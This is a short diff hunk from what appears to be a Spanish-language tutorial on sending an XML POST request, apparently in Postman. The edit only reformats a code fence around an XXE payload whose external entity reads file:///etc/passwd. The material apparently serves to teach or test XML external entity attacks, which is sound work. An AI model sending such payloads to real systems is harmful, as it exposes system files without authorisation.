@@ -12,7 +12,8 @@ La primera de ellas es una petición POST, por lo que selecciona dicha opción y
 otro ordenador tendrás que indicar su URL. A continuación entra en la pestaña Body, dentro de las opciones selecciona
  raw y en el  tipo de elemento selecciona text/xml. Después, en el campo de texto pega el XML:
 
-```<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+```
+   <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <!DOCTYPE bar [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
